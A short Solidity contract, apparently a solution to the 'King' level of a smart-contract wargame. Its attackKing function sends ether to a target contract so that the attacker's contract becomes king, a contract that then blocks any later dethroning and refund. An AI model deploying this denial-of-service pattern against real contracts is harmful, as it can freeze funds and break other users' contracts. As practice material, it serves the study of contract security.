// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    bool public callStatus;

    function attackKing (address payable _kingAddy) public payable returns(bool) {
        (callStatus,) = _kingAddy.call{value: msg.value }("");
        return callStatus;
    }
}